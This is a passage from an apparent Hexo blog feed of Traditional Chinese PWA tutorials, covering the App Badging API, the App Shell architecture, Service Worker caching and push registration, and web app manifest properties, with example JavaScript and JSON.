所以如果不想顯示 99+ 也可以自行改成 99</li><li>Chrome App Badging API 要求 App 要先被安裝</li><li>背景執行也支援透過 service worker 去叫用，所以可以整合推播</li></ul><p>跨瀏覽器支援的寫法，在前景透過程是直接叫用，就是先判斷有沒有這個 API 原則上有就是可以設定。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">setBadge</span>(<span class="params">...args</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (navigator.<span class="property">setAppBadge</span>) &#123;</span><br><span class="line">    navigator.<span class="title function_">setAppBadge</span>(...args);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (navigator.<span class="property">setExperimentalAppBadge</span>) &#123;</span><br><span class="line">    navigator.<span class="title function_">setExperimentalAppBadge</span>(...args);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">ExperimentalBadge</span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">ExperimentalBadge</span>.<span class="title function_">set</span>(...args);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">clearBadge</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (navigator.<span class="property">clearAppBadge</span>) &#123;</span><br><span class="line">    navigator.<span class="title function_">clearAppBadge</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (navigator.<span class="property">clearExperimentalAppBadge</span>) &#123;</span><br><span class="line">    navigator.<span class="title function_">clearExperimentalAppBadge</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">ExperimentalBadge</span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">ExperimentalBadge</span>.<span class="title function_">clear</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>透過 Service Worker，也是一樣先進行判斷後直接叫用，有就可以設定。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> requestCounter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&quot;fetch&quot;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="string">&quot;setAppBadge&quot;</span> <span class="keyword">in</span> navigator) &#123;</span><br><span class="line">    navigator.<span class="title function_">setAppBadge</span>(++requestCounter);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[Service Worker] Fetch&quot;</span>, e.<span class="property">request</span>.<span class="property">url</span>);</span><br><span class="line">  e.<span class="title function_">respondWith</span>(<span class="title function_">fetch</span>(e.<span class="property">request</span>));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App 架構模式</title>
      <link href="/2021/09/06/progressive-web-application/pwa-app-shell-model/"/>
      <url>/2021/09/06/progressive-web-application/pwa-app-shell-model/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-App-Shell"><a href="#什麼是-App-Shell" class="headerlink" title="什麼是 App Shell?"></a>什麼是 App Shell?</h2><p>App Shell 乍聽之下是一種技術，實際上是 Web App 架構模式 (Architectural Patterns)。</p><p>App Shell Model 這個架構模式目的是讓 Web App 可靠性以及在用戶開啟 App 後能像原生 App 一樣提供立即載入的效果。</p><p>對 Progressive Web App 來說，”shell” 可能包含形成基礎操作介面的 HTML、CSS、JavaScript，只要這些資源被快取，就能夠保證下次再啟動 App 時能有立即載入的效果，大大提供了 App 的考靠性和載入效能。</p><p>從原生 App 的角度來看，App Shell 就相當於發布到市集的安裝檔，內容只包含了操作介面的骨架，完整內容都是等到需要才會透過網路載入。</p><h2 id="App-Shell-解決了什麼問題"><a href="#App-Shell-解決了什麼問題" class="headerlink" title="App Shell 解決了什麼問題"></a>App Shell 解決了什麼問題</h2><p>對近年來流行的 single-page applications 來說，大家可能多少已經使用了 App Shell 的概念，簡單來說在架構的設計上將相關資源區分為</p><ul><li>Cache First: 靜態，基礎操作介面，所以不需要每次更新</li><li>Network First: 動態，必須要常更新的資料</li></ul><p>當我們用漸進式增強的概念來看，整個網站在改版上也是可以漸進式的修改，在新功能的撰寫時就盡可能地去</p><ul><li>應用邏輯、顯示內容分開</li><li>操作介面和內容分開</li></ul><p>最終我們期待整個站台能夠藉由快取相關基礎操作介面，能夠保證再次使用上的可靠性和效能，也能夠提供離線的操作模式，盡可能地減少數據傳輸的浪費。</p><p>另外透過骨架先載入，對用戶來說也能增加感知上的效能，近年來越來越多的網站都開始採用這樣的設計。</p><blockquote><p>Photo Credit: <a href="https://content.altexsoft.com/">https://content.altexsoft.com/</a><br>透過 Skeleton Design 增加感知上的效能<br><img src="https://content.altexsoft.com/media/2018/11/skeleton_loading.gif"></p></blockquote><h2 id="App-Shell-實際案例"><a href="#App-Shell-實際案例" class="headerlink" title="App Shell 實際案例"></a>App Shell 實際案例</h2><p>在 Google 的教學文件中，舉了下面這個站台當作例子:</p><p>站台連結: <a href="https://wiki-offline.jakearchibald.com/wiki/Rick_and_Morty">https://wiki-offline.jakearchibald.com/wiki/Rick_and_Morty</a></p><p>這個實際應用就很單純暴力，介面也相對單純，所以可以看得出來</p><ul><li>重新整理畫面時，相關的導航欄都不會消失</li><li>若勾選離線讀取，就連文章內容也會因為讀快取而秒開</li></ul><p>當然文章內容除了用 Cache 將 API 快取外，也能夠透過本地端的儲存相關機制進行儲存也是另外一種作法。</p><blockquote><p>Photo Credit: <a href="https://developers.google.com/">https://developers.google.com/</a><br>使用介面會被快取且先被載入<br><img src="https://developers.google.com/web/fundamentals/architecture/images/wikipedia.jpg"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App Service Worker</title>
      <link href="/2021/09/05/progressive-web-application/pwa-service-worker/"/>
      <url>/2021/09/05/progressive-web-application/pwa-service-worker/</url>
      
        <content type="html"><![CDATA[<h2 id="什麼是-Service-Workers"><a href="#什麼是-Service-Workers" class="headerlink" title="什麼是 Service Workers"></a>什麼是 Service Workers</h2><p>Service Workers 的角色是位於 Web App 與網路連接中間的一層 “代理網路連接”，就像是秘書一樣負責將資料處理後再轉介給 App。</p><p>還記得第一次看到這個名詞是因為看 <a href="https://developers.google.com/web/fundamentals/getting-started/codelabs/your-first-pwapp/?hl=zh-tw">Progressive Web App</a>，這裡比較新的觀念是可以幫助 web app 在網路較慢或是沒有連線時去使用快取資料。另外一個特性是 service worker 可以在頁面沒開啟時背景執行，由於可以背景執行，所以接受推播的任務也可以在這裡進行撰寫，需要注意的是推播分成兩部分實作，一部分是通知，一部分是接受推播，後端各家的概念上其實都是先針對 topic (可以想像成頻道) 進行訂閱，然後撰寫接收事件，然後觸發通知。</p><p>最終透過這樣的技術實現，這層 “代理網路連接” 讓資源能夠被快取下來且能夠讓裝置在離線時被使用，JavaScript 是單線程的語言，但是 Service Workers 會跟頁面的 thread 分開運行，且不會影響到 DOM 的結構，這個概念就像是打 API 其實也是非阻塞的執行，可以在收到資料後才進行動作，同樣的我們也可以把這樣的任務交給 Service Worker，除了離線快取以外，也能夠支援推播的處理或是讓 worker 來執行一些耗能的計算。</p><p>最後要注意的是 Service Workers 在考量安全性的基礎上，只能執行在 HTTPS 的環境。</p><h2 id="Service-Workers-常見用途"><a href="#Service-Workers-常見用途" class="headerlink" title="Service Workers 常見用途"></a>Service Workers 常見用途</h2><ol><li>不同的快取策略運用<ul><li>Network or Cache: 使用線上資源或使用快取</li><li>Cache only: 只使用快取</li><li>Cache and update: 使用快取並使用線上資源更新快取</li><li>Cache, update and refresh: 使用快取，但同時也用線上資源來更新快取，若有新資源就同時更新畫面</li></ul></li><li>Web Push<ul><li>訂閱推播</li><li>推播內容樣式實作</li></ul></li></ol><h2 id="註冊與使用-Service-Worker"><a href="#註冊與使用-Service-Worker" class="headerlink" title="註冊與使用 Service Worker"></a>註冊與使用 Service Worker</h2><p>底下 Demo 了第一次先將圖片 icon 快取，第二次如果發現有使用到 dog 時則用 icon 取代，可以明顯看到有三個階段，實作上就是透過這幾個事件的觸發行為來達到我們的目的。</p><ul><li><code>install</code>: 安裝階段</li><li><code>activate</code>: 啟用階段，可以在這個階段清除舊的快取</li><li><code>fetch</code>: 代理網路，在這裡可以決定要回覆線上的內容或是快取的內容到 Web App 中</li></ul><p>首先第一步是去實作相關的事件內容，在 <code>install</code> 階段中有個 <code>waitUntil</code>，白話就是必須等待安裝成功後才去執行相關事件。</p><p>再來就是 cache 這個物件該怎麼去使用，初期我們就先不考慮那麼多，先照著範例進行撰寫，那既然是快取，有個重點就是快取要有版本名稱，程式碼中我們目前就是 V1。</p><p>caches 是提供給 Service Worker 使用的特殊 CacheStorage 物件，因為 web storage 在實作上是同步機制所以無法使用，在 Service Workers 中儲存都是以 Cache API 為主。</p><p>快取的 API 相關文件: <a href="https://developer.mozilla.org/en-US/docs/Web/API/Cache">https://developer.mozilla.org/en-US/docs/Web/API/Cache</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&quot;install&quot;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;installing…&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// cache a icon</span></span><br><span class="line">  event.<span class="title function_">waitUntil</span>(</span><br><span class="line">    caches.<span class="title function_">open</span>(<span class="string">&quot;v1&quot;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">cache</span>) =&gt;</span> cache.<span class="title function_">add</span>(<span class="string">&quot;images/icon.png&quot;</span>))</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&quot;activate&quot;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ready to handle fetches!&quot;</span>);</span><br><span class="line">  <span class="comment">// 可以在這個階段清除舊的快取</span></span><br><span class="line">  e.<span class="title function_">waitUntil</span>(</span><br><span class="line">    caches.<span class="title function_">keys</span>().<span class="title function_">then</span>(<span class="function">(<span class="params">keyList</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title class_">Promise</span>.<span class="title function_">all</span>(</span><br><span class="line">        keyList.<span class="title function_">map</span>(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (key === cacheName) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          caches.<span class="title function_">delete</span>(key);</span><br><span class="line">        &#125;)</span><br><span class="line">      );</span><br><span class="line">    &#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">self.<span class="title function_">addEventListener</span>(<span class="string">&quot;fetch&quot;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(event.<span class="property">request</span>.<span class="property">url</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (url.<span class="property">origin</span> == location.<span class="property">origin</span> &amp;&amp; url.<span class="property">pathname</span> == <span class="string">&quot;/images/dog.jpg&quot;</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(url);</span><br><span class="line">    event.<span class="title function_">respondWith</span>(caches.<span class="title function_">match</span>(<span class="string">&quot;images/icon.png&quot;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>最後實做完成後別忘了註冊，Service Worker 才會生效，這裡可以透過 Chrome 的內建工具來觀察:</p><ul><li><code>chrome://inspect/#service-workers</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&quot;serviceWorker&quot;</span> <span class="keyword">in</span> navigator) &#123;</span><br><span class="line">  navigator.<span class="property">serviceWorker</span>.<span class="title function_">register</span>(<span class="string">&quot;./pwa-examples/test/sw.js&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="PWA-推播"><a href="#PWA-推播" class="headerlink" title="PWA 推播"></a>PWA 推播</h2><ol><li>有支援的話，就能夠透過 Service Work 來使用推播功能 (swRegistration)</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> swRegistration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">initialiseUI</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// Set the initial subscription value</span></span><br><span class="line">  swRegistration.<span class="property">pushManager</span>.<span class="title function_">getSubscription</span>().<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">subscription</span>) &#123;</span><br><span class="line">    isSubscribed = !(subscription === <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isSubscribed) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;User IS subscribed.&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;User is NOT subscribed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">updateBtn</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">navigator.<span class="property">serviceWorker</span>.<span class="title function_">register</span>(<span class="string">&quot;sw.js&quot;</span>).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">swReg</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Service Worker is registered&quot;</span>, swReg);</span><br><span class="line"></span><br><span class="line">  swRegistration = swReg;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">initialiseUI</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>詳細教學可以參考:<br><a href="https://developers.google.com/web/fundamentals/codelabs/push-notifications?hl=zh-tw">https://developers.google.com/web/fundamentals/codelabs/push-notifications?hl=zh-tw</a></p><h2 id="Workbox"><a href="#Workbox" class="headerlink" title="Workbox"></a>Workbox</h2><p><a href="https://developers.google.com/web/tools/workbox">Workbox</a> 由 google 開發維護，是一套用來強化 service worker 的工具包，方便我們更快實作出 production-ready 的 Service Worker，幾種常見的快取都已經提供相關範例，其實我們只需要照抄即可。</p><ul><li>Cache Google Fonts</li><li>Cache JavaScript and CSS</li><li>Cache Images</li><li>Precache your Files</li><li>Offline Google Analytics</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWA </tag>
            
            <tag> 2021ironman </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Progressive Web App Manifest</title>
      <link href="/2021/09/04/progressive-web-application/pwa-manifest/"/>
      <url>/2021/09/04/progressive-web-application/pwa-manifest/</url>
      
        <content type="html"><![CDATA[<p>Web App 的 manifest 是一個 JSON 形式的配置檔，瀏覽器透過配置檔就會知道 Progressive Web App 該怎麼去安裝在用戶的電腦或手機裝置上，所以最基本的 manifest 會包含 App 的名稱、Icon、App 開啟時要顯示的 URL。</p><h2 id="建立-manifest-file"><a href="#建立-manifest-file" class="headerlink" title="建立 manifest file"></a>建立 manifest file</h2><p>命名上其實沒有特別規定，但通常會是 <code>manifest.json</code> 並且放置在專案的根目錄，規格上的副檔名是有特別建議 <code>.webmanifest</code> 所以其實也可以，但 JSON 格式較容易廣泛的辨識和理解。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;short_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Weather&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Weather: Do I need an umbrella?&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;icons&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/images/icons-192.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/png&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;sizes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192x192&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/images/icons-512.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/png&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;sizes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;512x512&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;start_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/?source=pwa&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;background_color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#3367D6&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;display&quot;</span><span class="punctuation">:</span> <span class="string">&quot;standalone&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scope&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;theme_color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#3367D6&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;shortcuts&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;How&#x27;s weather today?&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;short_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Today&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;View weather information for today&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/today?source=pwa&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;icons&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span> <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/images/today.png&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sizes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192x192&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;How&#x27;s weather tomorrow?&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;short_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Tomorrow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;View weather information for tomorrow&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tomorrow?source=pwa&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;icons&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">&#123;</span> <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/images/tomorrow.png&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;sizes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192x192&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Weather forecast information&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;screenshots&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/images/screenshot1.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/png&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;sizes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;540x720&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/images/screenshot2.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;sizes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;540x720&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="manifest-屬性-Key-manifest-properties"><a href="#manifest-屬性-Key-manifest-properties" class="headerlink" title="manifest 屬性 (Key manifest properties)"></a>manifest 屬性 (Key manifest properties)</h2><ul><li><code>name</code>&#x2F;<code>short_name</code>: 安裝後的 App 名稱 <code>short_name</code> 會用在顯示上有限制的地方</li><li><code>icons</code>: 主畫面或是任務切換時顯示</li><li><code>start_url</code>: App 開啟預設頁，須注意為相對路徑跟 manifest 位置相關，有填 Chrome 才會跳提示</li><li><code>background_color</code>: 在加入主畫面後，啟動時 splash screen 的背景主視覺，在還沒安裝前的網址列也會改變顏色</li><li><code>display</code>: 定義 App 開啟後的顯示方式目前有三種，各有細微差異 <code>fullscreen</code>、<code>standalone</code>、<code>minimal-ui</code></li></ul><h3 id="short-name、name"><a href="#short-name、name" class="headerlink" title="short_name、name"></a>short_name、name</h3><p>兩個必須擇一填，若兩者都填</p><ul><li>short_name: 用在主畫面、啟動畫面或是其他顯示受限的地方</li><li>name: 安裝時使用</li></ul><h3 id="background-color"><a href="#background-color" class="headerlink" title="background_color"></a>background_color</h3><p>啟動畫面的 splash screen 背景色</p><h3 id="theme-color"><a href="#theme-color" class="headerlink" title="theme_color"></a>theme_color</h3><p>網址列的顏色，注意要和 meta 中的顏色相同。</p><p><code>&lt;meta name=&quot;theme-color&quot; content=&quot;#3c553c&quot; /&gt;</code></p><h3 id="icons"><a href="#icons" class="headerlink" title="icons"></a>icons</h3><p>當用戶安裝 PWA 的時候，我們可以預先提供一套不同解析度的 icon 給瀏覽器用在不同的位置，icons 是包含圖片物件的陣列，對 Chrome 來說, PWA 至少要提供 192x192 和 512x512 兩種解析度的 icon，剩下的情境 Chrome 會自動針對裝置做優化。</p><p>每一個圖片物件須包含以下屬性:</p><ul><li>src</li><li>sizes</li><li>type</li><li>purpose: 選填，可填入 “any maskable”，在 Android 手機中可以發現 icon 會依照手機主題樣式變成圓形或其他形狀，所以 icon 在設計上可以特別注意。<ul><li><a href="https://web.dev/maskable-icon/">https://web.dev/maskable-icon/</a></li></ul></li></ul><blockquote><p>Photo Credit: <a href="https://web.dev/">https://web.dev/</a><br>透過開發者工具勾選 Show only the minimum safe area for maskable icons 來看現在的 Icon 是否 maskable<br><img src="https://web-dev.imgix.net/image/admin/UeKTJM2SE0SQhgnnyaQG.png?auto=format&w=845"></p></blockquote><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>說明這個 App 的一些介紹。</p><h3 id="screenshots"><a href="#screenshots" class="headerlink" title="screenshots"></a>screenshots</h3><p>screenshots 是包含圖片物件的陣列, 就是 App 的使用說明截圖，description 和 screenshots 主要都是安裝相關訊息，所以目前只會用在 Android 上的 Chrome。</p><p>要滿足以下條件:</p><ul><li>長寬介於 320px - 3840px</li><li>最大解析度不能超過最小的 2.3 倍</li><li>截圖要同樣的長寬比</li><li>僅支援 JPEG、PNG</li></ul><h3 id="display"><a href="#display" class="headerlink" title="display"></a>display</h3><p>透過這個屬性我們可以選擇 App 開啟後的介面，舉例來說我們可隱藏網址列使用全螢幕去操作，但並非所有的瀏覽器都完整支援，支援度會以下面的順序向下支援:</p><p><code>&quot;fullscreen&quot; → &quot;standalone&quot; → &quot;minimal-ui&quot; → &quot;browser&quot;</code></p><p>若想要跳過上面順序的某個階段，就需要透過 <code>display_override</code> 來蓋掉:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;display_override&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;window-control-overlay&quot;</span><span 